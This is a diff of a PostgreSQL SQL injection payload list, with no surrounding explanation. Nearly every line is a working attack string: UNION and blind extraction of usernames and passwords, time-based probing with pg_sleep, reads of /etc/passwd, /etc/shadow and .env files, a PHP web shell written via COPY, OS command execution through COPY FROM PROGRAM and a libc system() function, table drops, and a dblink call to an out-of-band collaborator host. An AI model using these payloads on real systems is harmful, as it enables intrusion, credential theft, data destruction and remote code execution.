@@ -1,49 +1,53 @@
-'
-"
-$$
-')
-$1$
-' --
-$$ UNION SELECT 1--
-
---
-/* comment */
-
-' UNION SELECT version(),NULL,NULL--
-' UNION SELECT current_user,NULL,NULL--
-' UNION SELECT current_database(),NULL,NULL--
-' UNION SELECT inet_server_addr(),NULL,NULL--
-
-' UNION SELECT datname,NULL FROM pg_database--
-
-' UNION SELECT tablename,NULL FROM pg_tables WHERE schemaname='public'--
-' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
-
-' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
-
-' AND SUBSTRING(password,1,1)='a'--
-' AND (SELECT COUNT(*) FROM users)>0--
-
-'; SELECT PG_SLEEP(5)--
-' AND 1=(SELECT 1 FROM PG_SLEEP(5))--
-' OR 1=1 AND (SELECT PG_SLEEP(5))--
-'; SELECT CASE WHEN (1=1) THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END--
-'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN PG_SLEEP(5) ELSE PG_SLEEP(0) END FROM users WHERE username='admin'--
-
-'; INSERT INTO users VALUES ('hacker','$2b$12$...')--
-'; UPDATE users SET is_admin=true WHERE username='hacker'--
-'; DROP TABLE users--
-
-' UNION SELECT pg_read_file('/etc/passwd'),NULL--
-' UNION SELECT pg_read_file('/var/www/html/.env'),NULL--
-
-'; COPY (SELECT '<?php system($_GET["c"]); ?>') TO '/var/www/html/shell.php'--
-
-'; COPY users FROM PROGRAM 'id'--
-'; COPY (SELECT 1) TO PROGRAM 'id'--
-'; CREATE TABLE cmd(t text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd--
-
-$$UNION SELECT 1$$
-$q$' UNION SELECT password FROM users-- $q$
-
-'; SELECT dblink_connect('host=COLLABORATOR user=a password=a dbname=a')--
+' AND SLEEP(5)-- (not supported in PG)
+'; SELECT pg_sleep(5)--
+'; SELECT pg_sleep(5);--
+1; SELECT pg_sleep(5)--
+1'; SELECT pg_sleep(5)--
+' AND 1=CAST((SELECT pg_sleep(5)) AS int)--
+' OR 1=CAST((SELECT pg_sleep(5)) AS int)--
+'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+'; SELECT CASE WHEN (1=2) THEN pg_sleep(5) ELSE pg_sleep(0) END--
+' UNION SELECT 1,2,3--
+' UNION SELECT 1,version(),3--
+' UNION SELECT 1,current_database(),3--
+' UNION SELECT 1,current_user,3--
+' UNION SELECT 1,session_user,3--
+' UNION SELECT 1,inet_server_addr(),3--
+' UNION SELECT 1,inet_server_port(),3--
+' UNION SELECT 1,pg_postmaster_start_time(),3--
+' UNION SELECT 1,string_agg(datname,','),3 FROM pg_database--
+' UNION SELECT 1,string_agg(tablename,','),3 FROM pg_tables WHERE schemaname='public'--
+' UNION SELECT 1,string_agg(column_name,','),3 FROM information_schema.columns WHERE table_name='users'--
+' UNION SELECT 1,string_agg(username||':'||password,','),3 FROM users--
+' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--
+' AND (SELECT ASCII(SUBSTRING(username,1,1)) FROM users LIMIT 1)=97--
+' AND (SELECT LENGTH(password) FROM users LIMIT 1)=32--
+' UNION SELECT 1,pg_read_file('/etc/passwd'),3--
+' UNION SELECT 1,pg_read_file('/etc/shadow'),3--
+' UNION SELECT 1,pg_read_binary_file('/var/www/html/.env'),3--
+'; COPY users TO '/tmp/users.csv'--
+'; COPY (SELECT * FROM users) TO '/var/www/html/users.txt'--
+'; COPY cmd_exec FROM PROGRAM 'id'--
+'; CREATE TABLE cmd_exec(cmd_output text)--
+'; INSERT INTO cmd_exec VALUES ($$ls$$::text)--
+'; COPY cmd_exec FROM PROGRAM 'whoami'--
+'; SELECT * FROM cmd_exec--
+'; CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6','system' LANGUAGE 'c' STRICT--
+'; SELECT system('id')--
+'; CREATE TABLE test(cmd text); COPY test FROM '/etc/passwd'--
+'; COPY test TO STDOUT--
+' AND 1=CAST((SELECT string_agg(username,',') FROM users) AS int)--
+' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+'; SELECT lo_import('/etc/passwd')--
+'; SELECT lo_export(lo_import('/etc/passwd'),'/var/www/html/passwd.txt')--
+'; SELECT large_object_oid FROM pg_largeobject_metadata LIMIT 5--
+'; SELECT encode(data,'escape') FROM pg_largeobject WHERE loid=16399 AND pageno=0--
+'; SELECT pg_ls_dir('/etc')--
+'; SELECT pg_ls_dir('/var/www/html')--
+'; SELECT pg_ls_dir('/tmp')--
+'; SELECT pg_file_settings()--
+'; SELECT pg_show_all_settings()--
+'; SELECT usename,passwd FROM pg_shadow--
+'; SELECT * FROM pg_authid--
+'; SELECT * FROM pg_roles--
+'; SELECT * FROM pg_user--
